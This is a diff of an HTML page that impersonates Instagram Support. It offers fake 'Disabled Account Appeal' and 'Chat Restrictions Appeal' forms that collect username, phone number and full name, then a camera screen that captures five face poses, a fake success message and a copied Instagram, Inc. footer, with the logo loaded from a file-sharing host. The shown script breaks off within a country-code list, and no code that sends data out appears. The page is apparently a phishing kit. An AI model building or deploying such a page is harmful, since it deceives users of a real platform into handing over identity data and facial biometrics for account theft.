@@ -3,20 +3,18 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Instagram Support Center</title>
+    <title>Instagram Support</title>
     <style>
-        /* ----- Reset & Base ----- */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background: #fff;
             color: #262626;
         }
-        /* ----- Header ----- */
         .header {
             background: #fff;
             border-bottom: 1px solid #dbdbdb;
@@ -27,32 +25,6 @@
             height: 40px;
             width: auto;
         }
-        /* ----- Search Bar ----- */
-        .search-container {
-            max-width: 600px;
-            margin: 20px auto;
-            padding: 0 16px;
-            position: relative;
-        }
-        .search-icon {
-            position: absolute;
-            left: 28px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 16px;
-            height: 16px;
-            opacity: 0.5;
-        }
-        .search-box {
-            width: 100%;
-            padding: 8px 12px 8px 40px;
-            font-size: 14px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background: #fafafa;
-            color: #8e8e8e;
-        }
-        /* ----- Main Container ----- */
         .main-container {
             max-width: 600px;
             margin: 0 auto;
@@ -71,7 +43,6 @@
             margin-bottom: 12px;
             cursor: pointer;
             display: flex;
-            align-items: flex-start;
             gap: 12px;
             transition: background 0.2s;
         }
@@ -107,15 +78,12 @@
         .option-title {
             font-size: 16px;
             font-weight: 600;
-            color: #262626;
-            margin-bottom: 6px;
         }
         .option-description {
             font-size: 14px;
             color: #8e8e8e;
             line-height: 1.5;
         }
-        /* ----- Forms ----- */
         .form-container {
             display: none;
         }
@@ -131,13 +99,11 @@
         .form-title {
             font-size: 16px;
             font-weight: 600;
-            color: #262626;
             margin-bottom: 12px;
         }
         .form-description {
             font-size: 14px;
             color: #8e8e8e;
-            line-height: 1.5;
             margin-bottom: 20px;
         }
         .form-group {
@@ -145,9 +111,8 @@
         }
         .form-label {
             font-size: 14px;
-            color: #262626;
-            margin-bottom: 6px;
             display: block;
+            margin-bottom: 6px;
         }
         .form-input,
         .form-select {
@@ -157,8 +122,6 @@
             border: 1px solid #dbdbdb;
             border-radius: 3px;
             background: #fafafa;
-            color: #262626;
-            font-family: inherit;
         }
         .form-input:focus,
         .form-select:focus {
@@ -166,11 +129,11 @@
             border-color: #a8a8a8;
             background: #fff;
         }
-        /* ----- Phone Group with Custom Dropdown ----- */
+
+        /* ----- CUSTOM DROPDOWN ----- */
         .phone-group {
             display: flex;
             gap: 10px;
-            align-items: center;
         }
         .country-dropdown {
             position: relative;
@@ -180,17 +143,16 @@
             display: flex;
             align-items: center;
             gap: 6px;
-            background: #fafafa;
+            padding: 9px 8px;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            padding: 9px 8px;
+            background: #fafafa;
             cursor: pointer;
             font-size: 14px;
         }
         .country-dropdown .selected .arrow {
             margin-left: auto;
-            font-size: 12px;
-            color: #8e8e8e;
+            font-size: 10px;
         }
         .country-dropdown .dropdown-list {
             display: none;
@@ -198,21 +160,21 @@
             top: 100%;
             left: 0;
             width: 100%;
-            max-height: 200px;
-            overflow-y: auto;
+            max-height: 250px;
             background: #fff;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            z-index: 100;
-            margin-top: 2px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 999;
+            margin-top: 2px;
+            overflow: hidden;
         }
         .country-dropdown .dropdown-list.open {
             display: block;
         }
         .country-dropdown .dropdown-search {
             padding: 6px 8px;
-            border-bottom: 1px solid #dbdbdb;
+            border-bottom: 1px solid #ddd;
         }
         .country-dropdown .dropdown-search input {
             width: 100%;
@@ -222,20 +184,19 @@
             font-size: 13px;
         }
         .country-dropdown .dropdown-options {
-            max-height: 160px;
+            max-height: 190px;
             overflow-y: auto;
         }
         .country-dropdown .dropdown-options .option {
-            padding: 8px 10px;
+            padding: 7px 10px;
             cursor: pointer;
             display: flex;
             align-items: center;
             gap: 8px;
             font-size: 13px;
-            border-bottom: 1px solid #f0f0f0;
+            border-bottom: 1px solid #f5f5f5;
         }
-        .country-dropdown .dropdown-options .option:hover,
-        .country-dropdown .dropdown-options .option.active {
+        .country-dropdown .dropdown-options .option:hover {
             background: #f0f0f0;
         }
         .country-dropdown .dropdown-options .option .flag {
@@ -243,7 +204,7 @@
         }
         .country-dropdown .dropdown-options .option .code {
             font-weight: 600;
-            color: #262626;
+            min-width: 40px;
         }
         .phone-input {
             flex: 1;
@@ -257,7 +218,7 @@
         .phone-error.show {
             display: block;
         }
-        /* ----- Buttons ----- */
+
         .send-btn {
             background: #0095f6;
             color: #fff;
@@ -271,66 +232,8 @@
         .send-btn:hover {
             background: #1877f2;
         }
-        /* ----- Footer ----- */
-        .footer {
-            background: #fafafa;
-            padding: 40px 20px 20px;
-            margin-top: 50px;
-        }
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 8px 16px;
-            margin-bottom: 16px;
-            max-width: 900px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        .footer-link {
-            font-size: 12px;
-            color: #00376b;
-            text-decoration: none;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.2px;
-        }
-        .footer-link:hover {
-            text-decoration: underline;
-        }
-        .footer-copyright {
-            text-align: center;
-            font-size: 12px;
-            color: #000;
-            margin-top: 16px;
-            font-weight: 400;
-        }
-        .footer-language {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 12px 16px;
-            margin-top: 20px;
-            max-width: 900px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        .footer-language a {
-            font-size: 12px;
-            color: #737373;
-            text-decoration: none;
-            font-weight: 400;
-            opacity: 0.7;
-        }
-        .footer-language a:hover {
-            text-decoration: underline;
-        }
-        .footer-language .active {
-            color: #262626;
-            font-weight: 600;
-            opacity: 1;
-        }
-        /* ----- Verification Screen ----- */
+
+        /* VERIFICATION SCREEN */
         .verification-screen {
             display: none;
             position: fixed;
@@ -340,10 +243,10 @@
             height: 100%;
             background: #fff;
             z-index: 1000;
+            flex-direction: column;
         }
         .verification-screen.active {
             display: flex;
-            flex-direction: column;
         }
         .verification-header {
             background: #fff;
@@ -354,7 +257,6 @@
         .verification-header h2 {
             font-size: 16px;
             font-weight: 600;
-            color: #262626;
         }
         .verification-content {
             flex: 1;
@@ -373,7 +275,6 @@
             border-radius: 8px;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 1px 8px rgba(0, 0, 0, 0.1);
         }
         #verificationVideo {
             width: 100%;
@@ -395,7 +296,6 @@
         }
         .face-oval.matched {
             border-color: #4caf50;
-            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5), 0 0 20px rgba(76, 175, 80, 0.6);
         }
         .pose-text {
             position: absolute;
@@ -407,7 +307,6 @@
             padding: 8px 16px;
             border-radius: 4px;
             font-size: 14px;
-            font-weight: 500;
         }
         .pose-count {
             position: absolute;
@@ -435,7 +334,8 @@
         .verification-submit-btn.show {
             display: block;
         }
-        /* ----- Success Modal ----- */
+
+        /* SUCCESS MODAL */
         .success-modal {
             display: none;
             position: fixed;
@@ -491,20 +391,65 @@
         .hidden {
             display: none !important;
         }
+
+        /* FOOTER */
+        .footer {
+            background: #fafafa;
+            padding: 40px 20px 20px;
+            margin-top: 50px;
+            text-align: center;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 16px;
+            margin-bottom: 16px;
+        }
+        .footer-link {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.2px;
+        }
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+        .footer-copyright {
+            font-size: 12px;
+            color: #000;
+            margin-top: 16px;
+        }
+        .footer-language {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px 16px;
+            margin-top: 20px;
+        }
+        .footer-language a {
+            font-size: 12px;
+            color: #737373;
+            text-decoration: none;
+            opacity: 0.7;
+        }
+        .footer-language a:hover {
+            text-decoration: underline;
+        }
+        .footer-language .active {
+            color: #262626;
+            font-weight: 600;
+            opacity: 1;
+        }
     </style>
 </head>
 <body>
+
     <!-- HEADER -->
     <div class="header">
         <img src="https://files.catbox.moe/5iyrej.png" alt="Instagram" />
-    </div>
-
-    <!-- SEARCH BAR -->
-    <div class="search-container">
-        <svg class="search-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M21 21L16.65 16.65M19 11C19 15.4183 15.4183 19 11 19C6.58172 19 3 15.4183 3 11C3 6.58172 6.58172 3 11 3C15.4183 3 19 6.58172 19 11Z" stroke="#8e8e8e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-        <input type="text" class="search-box" placeholder="How can we help?" readonly />
     </div>
 
     <!-- SELECTION SCREEN -->
@@ -514,24 +459,23 @@
             <div class="radio-circle"></div>
             <div class="option-content">
                 <div class="option-title">Disabled Account Appeal (New)</div>
-                <div class="option-description">If your Instagram account has been disabled, submit an appeal to request a review. Please provide accurate information for faster processing.</div>
+                <div class="option-description">If your Instagram account has been disabled, submit an appeal to request a review.</div>
             </div>
         </div>
         <div class="option-item" onclick="selectOption('chat', this)">
             <div class="radio-circle"></div>
             <div class="option-content">
                 <div class="option-title">Instagram Chat Restrictions Appeal</div>
-                <div class="option-description">Appeal against chat restrictions or message blocking on your Instagram account. We'll review your case and get back to you.</div>
+                <div class="option-description">Appeal against chat restrictions or message blocking on your Instagram account.</div>
             </div>
         </div>
     </div>
 
-    <!-- DISABLED ACCOUNT FORM -->
+    <!-- DISABLED FORM -->
     <div class="main-container form-container" id="disabledForm">
-        <div class="help-center-label">Help Center</div>
         <div class="form-box">
-            <h1 class="form-title">Disabled Account Appeal (New)</h1>
-            <p class="form-description">If your Instagram account has been disabled, submit an appeal to request a review. Please provide accurate information for faster processing.</p>
+            <h1 class="form-title">Disabled Account Appeal</h1>
+            <p class="form-description">Submit your appeal. Please provide accurate information.</p>
             <form id="disabledAppealForm">
                 <div class="form-group">
                     <label class="form-label">Instagram Username</label>
@@ -543,42 +487,38 @@
                 </div>
                 <div class="form-group">
                     <label class="form-label">Phone Number</label>
-                    <div class="phone-group">
-                        <!-- Country Code Dropdown -->
+                    <div class="phone-group" id="phoneGroup1">
                         <div class="country-dropdown" id="countryDropdown1">
-                            <div class="selected" onclick="toggleDropdown(this)">
+                            <div class="selected" onclick="toggleDropdown('countryDropdown1')">
                                 <span class="flag">🌍</span>
-                                <span class="code">+91</span>
+                                <span class="code" id="selectedCode1">+91</span>
                                 <span class="arrow">▼</span>
                             </div>
-                            <div class="dropdown-list">
+                            <div class="dropdown-list" id="dropdownList1">
                                 <div class="dropdown-search">
-                                    <input type="text" placeholder="Search country..." oninput="filterCountries(this)" />
+                                    <input type="text" placeholder="Search..." oninput="filterDropdown('countryDropdown1')" />
                                 </div>
-                                <div class="dropdown-options" id="optionsContainer1">
-                                    <!-- options will be populated by JS -->
-                                </div>
+                                <div class="dropdown-options" id="optionsContainer1"></div>
                             </div>
                         </div>
-                        <!-- Phone Number Input -->
-                        <input type="tel" class="form-input phone-input" name="phoneNumber" placeholder="Enter phone number" required />
+                        <input type="tel" class="form-input phone-input" id="phoneInput1" placeholder="Enter phone number" required />
                     </div>
-                    <div class="phone-error" id="phoneError1">Phone number must be at most 10 digits (after country code).</div>
+                    <div class="phone-error" id="phoneError1">Please enter 7-10 digits after country code.</div>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Full Name</label>
                     <input type="text" class="form-input" name="fullname" required />
                 </div>
                 <div class="form-group">
-                    <label class="form-label">Alternative Instagram Account (Optional)</label>
+                    <label class="form-label">Alternative Account (Optional)</label>
                     <input type="text" class="form-input" name="alternative" />
                 </div>
                 <div class="form-group">
-                    <label class="form-label">Your Relationship to This Account</label>
+                    <label class="form-label">Relationship</label>
                     <select class="form-select" name="relationship" required>
                         <option value="">Select an option</option>
                         <option value="owner">I am the rights owner</option>
-                        <option value="representative">I am representing my organization or client</option>
+                        <option value="representative">I am representing my organization</option>
                         <option value="behalf">I am reporting on behalf of someone else</option>
                     </select>
                 </div>
@@ -589,10 +529,9 @@
 
     <!-- CHAT RESTRICTIONS FORM -->
     <div class="main-container form-container" id="chatForm">
-        <div class="help-center-label">Help Center</div>
         <div class="form-box">
-            <h1 class="form-title">Instagram Chat Restrictions Appeal</h1>
-            <p class="form-description">Appeal against chat restrictions or message blocking on your Instagram account. We'll review your case and get back to you.</p>
+            <h1 class="form-title">Chat Restrictions Appeal</h1>
+            <p class="form-description">Appeal against chat restrictions or message blocking on your Instagram account.</p>
             <form id="chatAppealForm">
                 <div class="form-group">
                     <label class="form-label">Instagram Username</label>
@@ -604,40 +543,38 @@
                 </div>
                 <div class="form-group">
                     <label class="form-label">Phone Number</label>
-                    <div class="phone-group">
+                    <div class="phone-group" id="phoneGroup2">
                         <div class="country-dropdown" id="countryDropdown2">
-                            <div class="selected" onclick="toggleDropdown(this)">
+                            <div class="selected" onclick="toggleDropdown('countryDropdown2')">
                                 <span class="flag">🌍</span>
-                                <span class="code">+91</span>
+                                <span class="code" id="selectedCode2">+91</span>
                                 <span class="arrow">▼</span>
                             </div>
-                            <div class="dropdown-list">
+                            <div class="dropdown-list" id="dropdownList2">
                                 <div class="dropdown-search">
-                                    <input type="text" placeholder="Search country..." oninput="filterCountries(this)" />
+                                    <input type="text" placeholder="Search..." oninput="filterDropdown('countryDropdown2')" />
                                 </div>
-                                <div class="dropdown-options" id="optionsContainer2">
-                                    <!-- options -->
-                                </div>
+                                <div class="dropdown-options" id="optionsContainer2"></div>
                             </div>
                         </div>
-                        <input type="tel" class="form-input phone-input" name="phoneNumber" placeholder="Enter phone number" required />
+                        <input type="tel" class="form-input phone-input" id="phoneInput2" placeholder="Enter phone number" required />
                     </div>
-                    <div class="phone-error" id="phoneError2">Phone number must be at most 10 digits (after country code).</div>
+                    <div class="phone-error" id="phoneError2">Please enter 7-10 digits after country code.</div>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Full Name</label>
                     <input type="text" class="form-input" name="fullname" required />
                 </div>
                 <div class="form-group">
-                    <label class="form-label">Alternative Instagram Account (Optional)</label>
+                    <label class="form-label">Alternative Account (Optional)</label>
                     <input type="text" class="form-input" name="alternative" />
                 </div>
                 <div class="form-group">
-                    <label class="form-label">Your Relationship to This Account</label>
+                    <label class="form-label">Relationship</label>
                     <select class="form-select" name="relationship" required>
                         <option value="">Select an option</option>
                         <option value="owner">I am the rights owner</option>
-                        <option value="representative">I am representing my organization or client</option>
+                        <option value="representative">I am representing my organization</option>
                         <option value="behalf">I am reporting on behalf of someone else</option>
                     </select>
                 </div>
@@ -653,8 +590,8 @@
             <div class="camera-box">
                 <video id="verificationVideo" autoplay playsinline></video>
                 <div class="face-oval" id="faceOval"></div>
-                <div class="pose-text" id="poseText">Look Straight at Camera</div>
-                <div class="pose-count" id="poseCount">Pose 1 of 5</div>
+                <div class="pose-text" id="poseText">Look Straight</div>
+                <div class="pose-count" id="poseCount">1/5</div>
             </div>
             <button class="verification-submit-btn" id="verificationSubmitBtn">Submit Verification</button>
         </div>
@@ -662,284 +599,166 @@
 
     <!-- SUCCESS MODAL -->
     <div class="success-modal" id="successModal">
-        <div class="modal-header">Form Submitted Successfully</div>
-        <div class="modal-body">Your form has been submitted successfully. We have received your information and will process it shortly.</div>
-        <div class="modal-footer"><button class="modal-btn" onclick="redirectToMainPage()">Okay</button></div>
+        <div class="modal-header">✅ Form Submitted</div>
+        <div class="modal-body">Your form has been submitted successfully. We will process it shortly.</div>
+        <div class="modal-footer"><button class="modal-btn" onclick="redirectToMain()">Okay</button></div>
     </div>
 
     <!-- FOOTER -->
     <div class="footer">
         <div class="footer-links">
-            <a href="#" class="footer-link">ABOUT US</a>
-            <a href="#" class="footer-link">HELP</a>
+            <a href="#" class="footer-link">About</a>
+            <a href="#" class="footer-link">Help</a>
             <a href="#" class="footer-link">API</a>
-            <a href="#" class="footer-link">JOBS</a>
-            <a href="#" class="footer-link">TERMS</a>
-            <a href="#" class="footer-link">PRIVACY</a>
+            <a href="#" class="footer-link">Jobs</a>
+            <a href="#" class="footer-link">Terms</a>
+            <a href="#" class="footer-link">Privacy</a>
         </div>
-        <div class="footer-copyright">© <span id="footerYear">2025</span> INSTAGRAM, INC.</div>
+        <div class="footer-copyright">© <span id="footerYear">2026</span> INSTAGRAM, INC.</div>
         <div class="footer-language">
-            <a href="#" class="active">ENGLISH (US)</a>
-            <a href="#">ENGLISH (UK)</a>
-            <a href="#">हिन्दी</a>
-            <a href="#">ਪੰਜਾਬੀ</a>
-            <a href="#">اردو</a>
-            <a href="#">ગુજરાતી</a>
-            <a href="#">বাংলা</a>
-            <a href="#">தமிழ்</a>
-            <a href="#">తెలుగు</a>
-            <a href="#">മലയാളം</a>
-            <a href="#">ಕನ್ನಡ</a>
+            <a href="#" class="active">English (US)</a>
+            <a href="#">Hindi</a>
+            <a href="#">Punjabi</a>
+            <a href="#">Urdu</a>
+            <a href="#">Gujarati</a>
+            <a href="#">Tamil</a>
+            <a href="#">Telugu</a>
         </div>
     </div>
 
     <script>
         // ============================================================
-        // 1. COUNTRY DATABASE (ISO, Code, Flag, Name)
+        // 1. COUNTRY DATABASE
         // ============================================================
-        const countries = [
-            { iso: "AF", code: "+93", flag: "🇦🇫", name: "Afghanistan" },
-            { iso: "AL", code: "+355", flag: "🇦🇱", name: "Albania" },
-            { iso: "DZ", code: "+213", flag: "🇩🇿", name: "Algeria" },
-            { iso: "AD", code: "+376", flag: "🇦🇩", name: "Andorra" },
-            { iso: "AO", code: "+244", flag: "🇦🇴", name: "Angola" },
-            { iso: "AR", code: "+54", flag: "🇦🇷", name: "Argentina" },
-            { iso: "AM", code: "+374", flag: "🇦🇲", name: "Armenia" },
-            { iso: "AU", code: "+61", flag: "🇦🇺", name: "Australia" },
-            { iso: "AT", code: "+43", flag: "🇦🇹", name: "Austria" },
-            { iso: "AZ", code: "+994", flag: "🇦🇿", name: "Azerbaijan" },
-            { iso: "BH", code: "+973", flag: "🇧🇭", name: "Bahrain" },
-            { iso: "BD", code: "+880", flag: "🇧🇩", name: "Bangladesh" },
-            { iso: "BY", code: "+375", flag: "🇧🇾", name: "Belarus" },
-            { iso: "BE", code: "+32", flag: "🇧🇪", name: "Belgium" },
-            { iso: "BZ", code: "+501", flag: "🇧🇿", name: "Belize" },
-            { iso: "BJ", code: "+229", flag: "🇧🇯", name: "Benin" },
-            { iso: "BT", code: "+975", flag: "🇧🇹", name: "Bhutan" },
-            { iso: "BO", code: "+591", flag: "🇧🇴", name: "Bolivia" },
-            { iso: "BA", code: "+387", flag: "🇧🇦", name: "Bosnia" },
-            { iso: "BW", code: "+267", flag: "🇧🇼", name: "Botswana" },
-            { iso: "BR", code: "+55", flag: "🇧🇷", name: "Brazil" },
-            { iso: "BN", code: "+673", flag: "🇧🇳", name: "Brunei" },
-            { iso: "BG", code: "+359", flag: "🇧🇬", name: "Bulgaria" },
-            { iso: "BF", code: "+226", flag: "🇧🇫", name: "Burkina Faso" },
-            { iso: "BI", code: "+257", flag: "🇧🇮", name: "Burundi" },
-            { iso: "KH", code: "+855", flag: "🇰🇭", name: "Cambodia" },
-            { iso: "CM", code: "+237", flag: "🇨🇲", name: "Cameroon" },
-            { iso: "CA", code: "+1", flag: "🇨🇦", name: "Canada" },
-            { iso: "CV", code: "+238", flag: "🇨🇻", name: "Cape Verde" },
-            { iso: "CF", code: "+236", flag: "🇨🇫", name: "Central African Republic" },
-            { iso: "TD", code: "+235", flag: "🇹🇩", name: "Chad" },
-            { iso: "CL", code: "+56", flag: "🇨🇱", name: "Chile" },
-            { iso: "CN", code: "+86", flag: "🇨🇳", name: "China" },
-            { iso: "CO", code: "+57", flag: "🇨🇴", name: "Colombia" },
-            { iso: "KM", code: "+269", flag: "🇰🇲", name: "Comoros" },
-            { iso: "CG", code: "+242", flag: "🇨🇬", name: "Congo" },
-            { iso: "CR", code: "+506", flag: "🇨🇷", name: "Costa Rica" },
-            { iso: "HR", code: "+385", flag: "🇭🇷", name: "Croatia" },
-            { iso: "CU", code: "+53", flag: "🇨🇺", name: "Cuba" },
-            { iso: "CY", code: "+357", flag: "🇨🇾", name: "Cyprus" },
-            { iso: "CZ", code: "+420", flag: "🇨🇿", name: "Czech Republic" },
-            { iso: "DK", code: "+45", flag: "🇩🇰", name: "Denmark" },
-            { iso: "DJ", code: "+253", flag: "🇩🇯", name: "Djibouti" },
-            { iso: "EC", code: "+593", flag: "🇪🇨", name: "Ecuador" },
-            { iso: "EG", code: "+20", flag: "🇪🇬", name: "Egypt" },
-            { iso: "SV", code: "+503", flag: "🇸🇻", name: "El Salvador" },
-            { iso: "GQ", code: "+240", flag: "🇬🇶", name: "Equatorial Guinea" },
-            { iso: "ER", code: "+291", flag: "🇪🇷", name: "Eritrea" },
-            { iso: "EE", code: "+372", flag: "🇪🇪", name: "Estonia" },
-            { iso: "SZ", code: "+268", flag: "🇸🇿", name: "Eswatini" },
-            { iso: "ET", code: "+251", flag: "🇪🇹", name: "Ethiopia" },
-            { iso: "FJ", code: "+679", flag: "🇫🇯", name: "Fiji" },
-            { iso: "FI", code: "+358", flag: "🇫🇮", name: "Finland" },
-            { iso: "FR", code: "+33", flag: "🇫🇷", name: "France" },
-            { iso: "GA", code: "+241", flag: "🇬🇦", name: "Gabon" },
-            { iso: "GM", code: "+220", flag: "🇬🇲", name: "Gambia" },
-            { iso: "GE", code: "+995", flag: "🇬🇪", name: "Georgia" },
-            { iso: "DE", code: "+49", flag: "🇩🇪", name: "Germany" },
-            { iso: "GH", code: "+233", flag: "🇬🇭", name: "Ghana" },
-            { iso: "GR", code: "+30", flag: "🇬🇷", name: "Greece" },
-            { iso: "GT", code: "+502", flag: "🇬🇹", name: "Guatemala" },
-            { iso: "GN", code: "+224", flag: "🇬🇳", name: "Guinea" },
-            { iso: "GY", code: "+592", flag: "🇬🇾", name: "Guyana" },
-            { iso: "HT", code: "+509", flag: "🇭🇹", name: "Haiti" },
-            { iso: "HN", code: "+504", flag: "🇭🇳", name: "Honduras" },
-            { iso: "HU", code: "+36", flag: "🇭🇺", name: "Hungary" },
-            { iso: "IS", code: "+354", flag: "🇮🇸", name: "Iceland" },
-            { iso: "IN", code: "+91", flag: "🇮🇳", name: "India" },
-            { iso: "ID", code: "+62", flag: "🇮🇩", name: "Indonesia" },
-            { iso: "IR", code: "+98", flag: "🇮🇷", name: "Iran" },
-            { iso: "IQ", code: "+964", flag: "🇮🇶", name: "Iraq" },
-            { iso: "IE", code: "+353", flag: "🇮🇪", name: "Ireland" },
-            { iso: "IL", code: "+972", flag: "🇮🇱", name: "Israel" },
-            { iso: "IT", code: "+39", flag: "🇮🇹", name: "Italy" },
-            { iso: "CI", code: "+225", flag: "🇨🇮", name: "Ivory Coast" },
-            { iso: "JP", code: "+81", flag: "🇯🇵", name: "Japan" },
-            { iso: "JO", code: "+962", flag: "🇯🇴", name: "Jordan" },
-            { iso: "KZ", code: "+7", flag: "🇰🇿", name: "Kazakhstan" },
-            { iso: "KE", code: "+254", flag: "🇰🇪", name: "Kenya" },
-            { iso: "KW", code: "+965", flag: "🇰🇼", name: "Kuwait" },
-            { iso: "KG", code: "+996", flag: "🇰🇬", name: "Kyrgyzstan" },
-            { iso: "LA", code: "+856", flag: "🇱🇦", name: "Laos" },
-            { iso: "LV", code: "+371", flag: "🇱🇻", name: "Latvia" },
-            { iso: "LB", code: "+961", flag: "🇱🇧", name: "Lebanon" },
-            { iso: "LS", code: "+266", flag: "🇱🇸", name: "Lesotho" },
-            { iso: "LR", code: "+231", flag: "🇱🇷", name: "Liberia" },
-            { iso: "LY", code: "+218", flag: "🇱🇾", name: "Libya" },
-            { iso: "LI", code: "+423", flag: "🇱🇮", name: "Liechtenstein" },
-            { iso: "LT", code: "+370", flag: "🇱🇹", name: "Lithuania" },
-            { iso: "LU", code: "+352", flag: "🇱🇺", name: "Luxembourg" },
-            { iso: "MG", code: "+261", flag: "🇲🇬", name: "Madagascar" },
-            { iso: "MW", code: "+265", flag: "🇲🇼", name: "Malawi" },
-            { iso: "MY", code: "+60", flag: "🇲🇾", name: "Malaysia" },
-            { iso: "MV", code: "+960", flag: "🇲🇻", name: "Maldives" },
-            { iso: "ML", code: "+223", flag: "🇲🇱", name: "Mali" },
-            { iso: "MT", code: "+356", flag: "🇲🇹", name: "Malta" },
-            { iso: "MR", code: "+222", flag: "🇲🇷", name: "Mauritania" },
-            { iso: "MU", code: "+230", flag: "🇲🇺", name: "Mauritius" },
-            { iso: "MX", code: "+52", flag: "🇲🇽", name: "Mexico" },
-            { iso: "MD", code: "+373", flag: "🇲🇩", name: "Moldova" },
-            { iso: "MC", code: "+377", flag: "🇲🇨", name: "Monaco" },
-            { iso: "MN", code: "+976", flag: "🇲🇳", name: "Mongolia" },
-            { iso: "ME", code: "+382", flag: "🇲🇪", name: "Montenegro" },
-            { iso: "MA", code: "+212", flag: "🇲🇦", name: "Morocco" },
-            { iso: "MZ", code: "+258", flag: "🇲🇿", name: "Mozambique" },
-            { iso: "MM", code: "+95", flag: "🇲🇲", name: "Myanmar" },
-            { iso: "NA", code: "+264", flag: "🇳🇦", name: "Namibia" },
-            { iso: "NP", code: "+977", flag: "🇳🇵", name: "Nepal" },
-            { iso: "NL", code: "+31", flag: "🇳🇱", name: "Netherlands" },
-            { iso: "NZ", code: "+64", flag: "🇳🇿", name: "New Zealand" },
-            { iso: "NI", code: "+505", flag: "🇳🇮", name: "Nicaragua" },
-            { iso: "NE", code: "+227", flag: "🇳🇪", name: "Niger" },
-            { iso: "NG", code: "+234", flag: "🇳🇬", name: "Nigeria" },
-            { iso: "MK", code: "+389", flag: "🇲🇰", name: "North Macedonia" },
-            { iso: "NO", code: "+47", flag: "🇳🇴", name: "Norway" },
-            { iso: "OM", code: "+968", flag: "🇴🇲", name: "Oman" },
-            { iso: "PK", code: "+92", flag: "🇵🇰", name: "Pakistan" },
-            { iso: "PA", code: "+507", flag: "🇵🇦", name: "Panama" },
-            { iso: "PG", code: "+675", flag: "🇵🇬", name: "Papua New Guinea" },
-            { iso: "PY", code: "+595", flag: "🇵🇾", name: "Paraguay" },
-            { iso: "PE", code: "+51", flag: "🇵🇪", name: "Peru" },
-            { iso: "PH", code: "+63", flag: "🇵🇭", name: "Philippines" },
-            { iso: "PL", code: "+48", flag: "🇵🇱", name: "Poland" },
-            { iso: "PT", code: "+351", flag: "🇵🇹", name: "Portugal" },
-            { iso: "QA", code: "+974", flag: "🇶🇦", name: "Qatar" },
-            { iso: "RO", code: "+40", flag: "🇷🇴", name: "Romania" },
-            { iso: "RU", code: "+7", flag: "🇷🇺", name: "Russia" },
-            { iso: "RW", code: "+250", flag: "🇷🇼", name: "Rwanda" },
-            { iso: "SA", code: "+966", flag: "🇸🇦", name: "Saudi Arabia" },
-            { iso: "SN", code: "+221", flag: "🇸🇳", name: "Senegal" },
-            { iso: "RS", code: "+381", flag: "🇷🇸", name: "Serbia" },
-            { iso: "SL", code: "+232", flag: "🇸🇱", name: "Sierra Leone" },
-            { iso: "SG", code: "+65", flag: "🇸🇬", name: "Singapore" },
-            { iso: "SK", code: "+421", flag: "🇸🇰", name: "Slovakia" },
-            { iso: "SI", code: "+386", flag: "🇸🇮", name: "Slovenia" },
-            { iso: "SO", code: "+252", flag: "🇸🇴", name: "Somalia" },
-            { iso: "ZA", code: "+27", flag: "🇿🇦", name: "South Africa" },
-            { iso: "KR", code: "+82", flag: "🇰🇷", name: "South Korea" },
-            { iso: "ES", code: "+34", flag: "🇪🇸", name: "Spain" },
-            { iso: "LK", code: "+94", flag: "🇱🇰", name: "Sri Lanka" },
-            { iso: "SD", code: "+249", flag: "🇸🇩", name: "Sudan" },
-            { iso: "SR", code: "+597", flag: "🇸🇷", name: "Suriname" },
-            { iso: "SE", code: "+46", flag: "🇸🇪", name: "Sweden" },
-            { iso: "CH", code: "+41", flag: "🇨🇭", name: "Switzerland" },
-            { iso: "SY", code: "+963", flag: "🇸🇾", name: "Syria" },
-            { iso: "TW", code: "+886", flag: "🇹🇼", name: "Taiwan" },
-            { iso: "TJ", code: "+992", flag: "🇹🇯", name: "Tajikistan" },
-            { iso: "TZ", code: "+255", flag: "🇹🇿", name: "Tanzania" },
-            { iso: "TH", code: "+66", flag: "🇹🇭", name: "Thailand" },
-            { iso: "TG", code: "+228", flag: "🇹🇬", name: "Togo" },
-            { iso: "TN", code: "+216", flag: "🇹🇳", name: "Tunisia" },
-            { iso: "TR", code: "+90", flag: "🇹🇷", name: "Turkey" },
-            { iso: "TM", code: "+993", flag: "🇹🇲", name: "Turkmenistan" },
-            { iso: "UG", code: "+256", flag: "🇺🇬", name: "Uganda" },
-            { iso: "UA", code: "+380", flag: "🇺🇦", name: "Ukraine" },
-            { iso: "AE", code: "+971", flag: "🇦🇪", name: "United Arab Emirates" },
-            { iso: "GB", code: "+44", flag: "🇬🇧", name: "United Kingdom" },
-            { iso: "US", code: "+1", flag: "🇺🇸", name: "United States" },
-            { iso: "UY", code: "+598", flag: "🇺🇾", name: "Uruguay" },
-            { iso: "UZ", code: "+998", flag: "🇺🇿", name: "Uzbekistan" },
-            { iso: "VA", code: "+379", flag: "🇻🇦", name: "Vatican City" },
-            { iso: "VE", code: "+58", flag: "🇻🇪", name: "Venezuela" },
-            { iso: "VN", code: "+84", flag: "🇻🇳", name: "Vietnam" },
